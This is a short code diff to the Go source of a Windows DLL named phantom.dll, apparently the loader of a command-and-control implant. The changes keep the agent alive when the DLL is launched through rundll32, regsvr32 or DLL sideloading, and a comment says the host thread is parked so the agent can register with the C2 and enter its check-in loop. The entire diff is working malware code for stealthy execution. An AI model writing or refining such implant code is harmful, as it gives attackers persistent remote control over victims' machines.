@@ -49,24 +49,29 @@ func startAgent() {
 }
 
 // Start is called via: rundll32.exe phantom.dll,Start
+// Blocks so rundll32 stays alive while the agent runs.
 //
 //export Start
 func Start() {
-	go startAgent()
+	startAgent()
 }
 
 // DllInstall is called via: regsvr32 /s /i phantom.dll
 //
 //export DllInstall
 func DllInstall() {
-	go startAgent()
+	startAgent()
 }
 
-// DllRegisterServer is called via: regsvr32 phantom.dll
+// DllRegisterServer is called via: regsvr32 phantom.dll or DLL sideloading.
+// Must return immediately, so agent runs in a goroutine and this thread sleeps.
 //
 //export DllRegisterServer
 func DllRegisterServer() C.HRESULT {
 	go startAgent()
+	// Park this thread so the host process stays alive long enough for the
+	// goroutine to register with the C2 and enter its check-in loop.
+	C.Sleep(C.DWORD(0xFFFFFFFF))
 	return 0 // S_OK
 }
 
